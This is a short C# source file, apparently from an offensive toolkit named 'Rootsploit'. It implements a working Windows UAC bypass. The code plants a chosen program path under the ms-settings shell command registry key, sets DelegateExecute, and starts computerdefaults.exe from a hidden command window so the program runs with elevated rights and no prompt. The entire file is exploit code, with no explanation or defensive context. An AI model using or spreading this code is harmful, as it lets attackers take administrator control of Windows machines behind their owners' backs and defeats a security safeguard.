﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Rootsploit
{
    internal class BeepBoopUAC
    {
        public static void BeepBoop(string prog)
        {

            RegGen(prog);
        }

        public static void RegGen(string program)
        {
            //reg to be created

            Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
            Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command").SetValue("", program, RegistryValueKind.String);
            Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command").SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
            Registry.CurrentUser.Close();


            Process process = new System.Diagnostics.Process();
            ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = @"/C computerdefaults.exe";
            process.StartInfo = startInfo;
            process.Start();

            //Process.GetCurrentProcess().Kill();



        }
    }
}

